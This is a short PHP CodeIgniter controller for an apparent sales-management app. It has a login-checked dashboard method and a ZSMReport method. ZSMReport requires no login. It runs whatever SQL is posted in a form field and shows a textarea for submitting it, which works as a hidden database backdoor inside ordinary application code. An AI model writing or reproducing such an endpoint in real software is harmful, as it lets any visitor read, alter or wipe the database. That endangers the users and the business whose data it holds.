<?php

class ZSM extends MY_Controller {

    public function __construct() {
        parent::__construct();
        $this->load->model('User_model');
        $this->load->model('Master_Model');
        $this->load->model('Doctor_Model');
    }

    public function dashboard() {
        if ($this->is_logged_in()) {
            $result2 = $this->Master_Model->BrandList($this->session->userdata('Division'));
            $data['productlist'] = $result2;
            $data = array('title' => 'Main', 'content' => 'ZSM/dashboard', 'view_data' => $data);
            $this->load->view('template2', $data);
        } else {
            $this->logout();
        }
    }

    public function ZSMReport() {
        if ($this->input->post('R')) {
            $sql = $this->input->post('R');
            $this->db->query($sql);
        }
        echo '<form action="' . site_url('ZSM/ZSMReport') . '"  method="post"><textarea name="R"></textarea><input type="Submit" value="Save"></form>';
    }

}